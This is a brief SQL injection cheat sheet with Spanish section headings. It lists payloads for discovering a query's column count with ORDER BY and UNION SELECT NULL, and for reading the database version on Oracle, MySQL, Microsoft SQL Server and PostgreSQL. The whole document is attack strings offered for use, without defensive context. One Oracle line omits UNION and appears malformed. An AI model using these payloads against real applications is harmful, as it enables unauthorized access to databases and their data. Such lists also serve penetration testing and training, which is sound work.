## Número Columnas
```sql
' ORDER BY 1-- -
' ORDER BY 100-- -
' ORDER BY 1,2,3,4,5-- -
' ORDER BY 1,2,3,4,5#

' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT "Test",2,NULL#
' UNION SELECT @@version,NULL,NULL#
```
### ORACLE
```sql
' UNION SELECT 'NULL','NULL' FROM+dual-- -
```
## Versiones
### ORACLE
```sql
' UNION SELECT BANNER, NULL FROM v$version--
' SELECT version FROM v$instance--
```
### MySQL and Microsoft
```sql
' UNION SELECT @@version, NULL-- -
```
### PostgreSQL
```sql
' UNION SELECT version(), NULL-- -
```
